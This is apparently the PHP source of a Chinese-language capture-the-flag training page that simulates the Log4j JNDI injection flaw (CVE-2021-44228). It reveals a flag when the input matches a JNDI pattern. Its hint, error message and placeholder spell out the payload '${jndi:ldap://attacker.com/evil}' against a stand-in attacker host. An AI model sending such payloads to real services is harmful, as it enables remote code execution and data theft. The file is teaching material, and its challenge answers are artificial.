<?php
require_once('../flag_helper.php');
$challengeName = 'log4j_sim';
$flagManager = getFlagManager();
$flag = $flagManager->getFlag($challengeName);
$message = "";
$logOutput = "";

// 模拟Log4j JNDI注入漏洞
$jndiLookups = [
    'ldap://' => 'LDAP服务器连接 - 返回恶意Java类',
    'rmi://' => 'RMI服务器连接 - 执行远程方法',
    'dns://' => 'DNS查询 - 数据外带',
];

if (isset($_GET['input'])) {
    $input = $_GET['input'];
    
    // 模拟日志记录 - 存在JNDI注入漏洞
    $logEntry = "[INFO] User input: $input";
    
    // 检测JNDI注入
    if (preg_match('/\$\{jndi:(ldap|rmi|dns):\/\//i', $input)) {
        preg_match('/\$\{jndi:([^:]+):\/\/([^}]+)\}/i', $input, $matches);
        if (count($matches) >= 3) {
            $protocol = $matches[1];
            $target = $matches[2];
            
            if ($protocol === 'ldap') {
                $logOutput = "⚠️ JNDI注入检测到！\n协议: $protocol://\n目标: $target\n\n模拟执行: 从LDAP服务器加载恶意类...\n[恶意类执行结果]\n🎯 " . $flag;
            } elseif ($protocol === 'dns') {
                $logOutput = "⚠️ JNDI注入检测到！\n协议: $protocol://\n目标: $target\n\n模拟执行: DNS查询发送到 $target\n[数据外带完成]\n🎯 " . $flag;
            } else {
                $logOutput = "⚠️ JNDI注入检测到！\n协议: $protocol://\n目标: $target\n\n🎯 " . $flag;
            }
        } else {
            $logOutput = "JNDI注入语法错误，正确格式: \${jndi:ldap://attacker.com/evil}";
        }
    } elseif (preg_match('/\$\{/', $input)) {
        $logOutput = "检测到表达式语法，但非JNDI查询。尝试 \${jndi:ldap://...}";
    } else {
        $logOutput = "日志记录: $logEntry";
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['answer'])) {
    $answer = trim($_POST['answer']);
    if ($answer === $flag) {
        $message = "success";
    } else {
        $message = "error";
    }
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>Log4j漏洞模拟 - HiveYarnZinc</title>
        <?php require_once '../progress_helper.php'; ?>
<style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Courier New', monospace; background: #0a0a0f; color: #00ff00; min-height: 100vh; padding: 20px; }
        .container { max-width: 800px; margin: 0 auto; }
        .header { text-align: center; margin-bottom: 40px; padding: 30px; border-bottom: 2px solid #ff3333; }
        .header h1 { font-size: 2.5em; color: #ff3333; text-shadow: 0 0 20px #ff3333; }
        .back-link { color: #00ffff; text-decoration: none; }
        .info-box { background: rgba(255,50,50,0.05); border: 1px solid #ff3333; border-radius: 10px; padding: 25px; margin-bottom: 30px; }
        .log4j-box { background: #000; border: 2px solid #ff3333; border-radius: 15px; padding: 30px; margin-bottom: 30px; }
        .log4j-box input { width: 100%; padding: 15px; background: #111; border: 1px solid #ff3333; color: #ff3333; font-size: 1em; border-radius: 5px; font-family: 'Courier New', monospace; }
        .log4j-box button { margin-top: 15px; padding: 12px 40px; background: linear-gradient(135deg, #ff3333, #cc0000); border: none; border-radius: 5px; color: #fff; cursor: pointer; }
        .log-output { background: #1a1a2e; padding: 20px; border-radius: 5px; margin-top: 15px; white-space: pre-wrap; color: #0f0; font-family: monospace; }
        .result { padding: 20px; border-radius: 10px; text-align: center; margin-bottom: 20px; }
        .result.success { background: rgba(0,255,0,0.1); border: 2px solid #00ff00; color: #00ff00; }
        .result.error { background: rgba(255,0,0,0.1); border: 2px solid #ff0000; color: #ff0000; }
        .submit-box { background: rgba(0,0,0,0.8); border: 2px dashed #ff3333; border-radius: 15px; padding: 40px; text-align: center; }
        .submit-box input { width: 100%; max-width: 400px; padding: 15px; background: #000; border: 1px solid #ff3333; color: #ff3333; font-size: 1.2em; border-radius: 5px; text-align: center; font-family: 'Courier New', monospace; }
        .submit-box button { margin-top: 20px; padding: 15px 50px; background: linear-gradient(135deg, #ff3333, #cc0000); border: none; border-radius: 5px; color: #fff; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header"><h1>☣️ Log4j漏洞模拟</h1><a href="../index.php" class="back-link">[ ← 返回首页 ]</a></div>
        <div class="info-box"><h3>💡 题目描述</h3>
            <p>Apache Log4j2 存在JNDI注入漏洞(CVE-2021-44228)。<br>
            <strong>目标:</strong> 构造JNDI注入Payload触发漏洞获取Flag<br>
            <span style="color:#ff0;">提示:</span> 使用 <code>\${jndi:ldap://...}</code> 或 <code>\${jndi:dns://...}</code></p>
        </div>
        
        <div class="log4j-box">
            <h3 style="color:#ff3333;margin-bottom:15px;">📋 日志输入</h3>
            <form method="GET">
                <input type="text" name="input" placeholder='${jndi:ldap://attacker.com/evil}' value="<?= htmlspecialchars($_GET['input'] ?? '') ?>">
                <button type="submit">[ 提交日志 ]</button>
            </form>
            <?php if ($logOutput): ?>
            <div class="log-output"><?= nl2br(htmlspecialchars($logOutput)) ?></div>
            <?php endif; ?>
        </div>
        
        <?php if ($message === 'success'): ?>
        <div class="result success"><h2>🎉 恭喜！</h2><p>Flag正确！</p></div>
        <?php elseif ($message === 'error'): ?>
        <div class="result error"><h2>❌ 错误</h2><p>Flag不正确！</p></div>
        <?php endif; ?>
        
        <div class="submit-box">
            <h3 style="color:#ff3333;margin-bottom:20px;">📝 提交Flag</h3>
            <form method="POST">
                <input type="text" name="answer" placeholder="HiveYarnZinc{...}">
                <button type="submit">[ 提交 ]</button>
            </form>
        </div>
    </div>
</body>
</html>
